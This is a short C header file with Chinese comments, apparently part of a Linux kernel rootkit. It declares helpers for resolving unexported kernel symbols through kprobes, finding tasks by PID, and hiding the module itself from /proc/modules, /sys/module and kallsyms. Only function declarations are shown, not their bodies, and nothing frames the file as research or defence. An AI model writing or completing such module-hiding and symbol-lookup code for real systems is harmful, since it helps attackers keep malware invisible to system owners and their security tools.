/* util.h — 内核辅助: 符号查找(兼容 5.4~6.6) / 进程查找 / 模块自隐藏 */
#ifndef _PK_UTIL_H
#define _PK_UTIL_H

#include <linux/types.h>
#include <linux/sched.h>

/* 内核 5.7 起 kallsyms_lookup_name 不再导出, 用 kprobe 落地 */
unsigned long pk_lookup_name(const char *name);

struct task_struct *pk_task_by_pid(__u32 pid);

/* 从模块链表摘除 + 摘 kobject, 隐藏 /sys/module/<name> 与 /proc/modules 条目 */
int pk_hide_self(const char *modname);

/* 让本模块在 kallsyms 中不可见 (5.7+ 靠 patch kallsyms_show_value) */
int pk_hide_kallsyms(void);

#endif
